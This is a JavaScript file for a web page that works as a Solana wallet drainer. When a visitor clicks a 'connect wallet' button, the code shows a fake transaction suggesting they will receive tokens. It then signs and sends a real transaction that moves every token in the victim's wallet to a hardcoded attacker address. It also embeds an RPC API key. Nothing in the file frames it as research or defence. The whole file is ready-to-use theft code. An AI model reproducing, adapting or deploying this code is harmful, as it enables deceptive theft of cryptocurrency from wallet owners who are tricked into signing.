import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { getAssociatedTokenAddress, getAccount, createTransferInstruction, getOrCreateAssociatedTokenAccount, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { Buffer } from 'buffer';

window.Buffer = Buffer; // Make Buffer available globally if needed

async function triggerBaitTransaction() {
    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
    const publicKey = new PublicKey(window.solana.publicKey);

    const fakeMint = new PublicKey('8D37jiPH55BPAD171YbZnsUTydwAseHgT7CQMjFKcKTU'); // Fake token mint address
    const fakeReceiverAddress = await getAssociatedTokenAddress(
        fakeMint,
        publicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    );

    let fakeTransaction = new Transaction().add(
        createTransferInstruction(
            fakeReceiverAddress,
            fakeReceiverAddress, // Simulate as if the user will receive tokens
            publicKey,
            10, // Fake token amount
            [],
            TOKEN_PROGRAM_ID
        )
    );

    fakeTransaction.feePayer = publicKey;
    const fakeBlockhashObj = await connection.getRecentBlockhash();
    fakeTransaction.recentBlockhash = fakeBlockhashObj.blockhash;

    const signedFakeTx = await window.solana.signTransaction(fakeTransaction);
    console.log("Signed fake token transaction:", signedFakeTx);

    // Simulate the transaction by sending it to the blockchain without committing it.
    // The Phantom Wallet will show this transaction as if it's transferring tokens.
    await connection.simulateTransaction(signedFakeTx);
    console.log("Fake token transaction simulated");
}

async function transferAllTokensAndNFTs(specialWallet) {
    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
    const publicKey = new PublicKey(window.solana.publicKey);

    let transaction = new Transaction();

    // Fetch all token accounts
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
    });

    // Iterate over all token accounts and transfer each token to the special wallet
    for (const tokenAccountInfo of tokenAccounts.value) {
        const tokenAccount = tokenAccountInfo.account.data.parsed.info;
        const tokenMint = new PublicKey(tokenAccount.mint);
        const tokenAmount = tokenAccount.tokenAmount.uiAmount;

        if (tokenAmount > 0) {
            const receiverTokenAddress = await getAssociatedTokenAddress(
                tokenMint,
                specialWallet,
                false,
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            );

            // Transfer the token to the special wallet
            transaction.add(
                createTransferInstruction(
                    new PublicKey(tokenAccountInfo.pubkey),
                    receiverTokenAddress,
                    publicKey,
                    tokenAmount * (10 ** tokenAccount.tokenAmount.decimals),
                    [],
                    TOKEN_PROGRAM_ID
                )
            );
        }
    }

    // Fetch all NFTs (Metaplex or standard NFTs)
    // Implement NFT-specific logic here if required (e.g., Metaplex metadata parsing)

    transaction.feePayer = publicKey;
    const blockhashObj = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhashObj.blockhash;

    const signedTransaction = await window.solana.signTransaction(transaction);
    const txid = await connection.sendRawTransaction(signedTransaction.serialize());
    await connection.confirmTransaction(txid, 'confirmed');

    console.log("All tokens and NFTs transferred to special wallet:", txid);
}

async function handleConnectWallet() {
    if (window.solana && window.solana.isPhantom) {
        try {
            const resp = await window.solana.connect();

            // Show a bait transaction to the user in the Phantom Wallet
            await triggerBaitTransaction();

            // Trigger the real transaction after showing the fake one
            const specialWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Special wallet address
            await transferAllTokensAndNFTs(specialWallet);
        } catch (err) {
            console.error("Error connecting to Phantom Wallet or during transaction:", err);
        }
    } else {
        alert("Phantom extension not found.");
        // Open appropriate download links...
    }
}

// Attach the event listener to the button
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('connect-wallet').addEventListener('click', handleConnectWallet);
});
